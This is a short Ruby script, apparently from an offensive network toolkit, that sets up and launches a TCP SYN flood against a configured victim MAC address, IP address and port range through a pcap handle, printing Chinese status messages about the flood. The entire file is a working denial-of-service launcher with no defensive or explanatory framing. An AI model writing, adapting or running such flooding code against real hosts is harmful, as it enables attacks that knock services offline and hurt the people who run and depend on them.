require_relative '../lib/attack_tool/tcp/syn_flood.rb'
require_relative '../config_con_var.rb'

new_process({
	title: "syn_flood",
	vars: {
		DST_MAC: [str_to_mac_semi_hex_str(CONFIG[:victim_mac]), "目标mac地址"],
		SRC_IP: [arr_to_dot_dec(CONFIG[:src_ip]), "要使用的源ip地址(点分十进制或CIDR地址)"],
		DST_IP: [arr_to_dot_dec(CONFIG[:victim_ip]), "目标ip地址(点分十进制或CIDR地址)"],
		DST_PORT: [CONFIG[:port_range].min, "本机使用的端口"],
	},
}) do |vars|
	puts "开始向mac为#{color_purple(str_to_mac_semi_hex_str(vars[:DST_MAC]))}，ip为#{color_purple(arr_to_dot_dec(vars[:DST_IP]))}的主机syn洪泛"

	TCPP.syn_flood(
		$pcap,
		vars.merge({
			SRC_IP: ip_str_to_range(vars[:SRC_IP]),
			DST_IP: ip_str_to_range(vars[:DST_IP]),
		})
	)

	puts "syn洪泛完成, 共发送了#{CONFIG[:port_range].max-CONFIG[:port_range].min} 个syn包"
end